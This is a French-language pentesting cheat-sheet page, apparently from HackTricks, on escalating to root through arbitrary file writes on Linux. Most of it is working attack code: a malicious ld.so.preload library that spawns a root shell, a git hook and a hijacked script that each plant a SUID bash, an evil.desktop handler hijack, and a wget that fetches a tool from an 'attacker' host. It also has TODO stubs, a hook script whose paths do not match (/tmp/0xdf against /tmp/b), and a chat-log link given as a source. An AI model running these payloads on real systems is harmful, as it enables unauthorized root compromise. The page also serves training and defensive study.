# Écriture arbitraire de fichier en tant que root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Ce fichier se comporte comme la variable d'environnement **`LD_PRELOAD`**, mais il fonctionne aussi avec les binaires **SUID**.\
Si vous pouvez le créer ou le modifier, vous pouvez simplement ajouter un **chemin vers une bibliothèque qui sera chargée** à l'exécution de chaque binaire.

Par exemple : `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sont des **scripts** qui sont **run** lors de divers **events** dans un git repository, comme lorsqu'un commit est créé ou lors d'un merge... Donc si un **privileged script or user** effectue ces actions fréquemment et qu'il est possible de **write in the `.git` folder**, cela peut être utilisé pour **privesc**.

Par exemple, il est possible de **generate a script** dans un git repo dans **`.git/hooks`** pour qu'il soit toujours exécuté lorsqu'un nouveau commit est créé :
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Fichiers Cron et temporels

TODO

### Fichiers de service et de socket

TODO

### binfmt_misc

Le fichier situé dans `/proc/sys/fs/binfmt_misc` indique quel binaire doit exécuter quel type de fichiers. TODO: vérifier les conditions requises pour abuser de ceci afin d'exécuter une rev shell lorsqu'un type de fichier courant est ouvert.

### Overwrite schema handlers (like http: or https:)

Un attaquant disposant de permissions d'écriture sur les répertoires de configuration d'une victime peut facilement remplacer ou créer des fichiers qui changent le comportement du système, entraînant une exécution de code non désirée. En modifiant le fichier `$HOME/.config/mimeapps.list` pour pointer les gestionnaires d'URL HTTP et HTTPS vers un fichier malveillant (par ex., en définissant `x-scheme-handler/http=evil.desktop`), l'attaquant s'assure que **cliquer sur n'importe quel lien http ou https déclenche le code spécifié dans ce fichier `evil.desktop`**. Par exemple, après avoir placé le code malveillant suivant dans `evil.desktop` dans `$HOME/.local/share/applications`, tout clic sur une URL externe exécute la commande intégrée :
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
For more info check [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) where it was used to exploit a real vulnerability.

### Root exécutant des scripts/binaires modifiables par l'utilisateur

Si un workflow privilégié exécute quelque chose comme `/bin/sh /home/username/.../script` (ou n'importe quel binaire situé dans un répertoire appartenant à un utilisateur non privilégié), vous pouvez le détourner :

- **Détecter l'exécution :** monitor processes with [pspy](https://github.com/DominicBreuker/pspy) to catch root invoking user-controlled paths:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirmer la possibilité d'écriture :** s'assurer que le fichier cible et son répertoire appartiennent à votre utilisateur et sont accessibles en écriture.
- **Détourner la cible :** sauvegarder le binaire/script original et déposer une charge utile qui crée un shell SUID (ou toute autre action root), puis restaurer les permissions :
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Déclencher l'action privilégiée** (par ex., en appuyant sur un bouton de l'UI qui lance le helper). Lorsque root réexécute le chemin détourné, récupérez le shell escaladé avec `./rootshell -p`.

## Références

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)

{{#include ../../banners/hacktricks-training.md}}
